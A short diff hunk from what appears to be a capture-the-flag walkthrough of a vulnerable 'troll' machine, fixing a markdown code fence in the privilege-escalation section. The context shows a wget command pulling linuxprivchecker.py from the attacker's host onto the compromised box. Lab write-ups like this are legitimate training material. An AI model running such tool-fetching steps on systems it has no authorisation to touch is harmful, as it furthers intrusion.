@@ -327,7 +327,7 @@ Privilege Escalation
 
 After logging in again, [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) script is downloaded to the victim's machine to enumerate possible privilege escalation vectors.
 
-``
+```
 overflow@troll:/tmp$ wget 192.168.20.144/linuxprivchecker.py
 --2019-09-15 17:47:57--  http://192.168.20.144/linuxprivchecker.py
 Connecting to 192.168.20.144:80... connected.
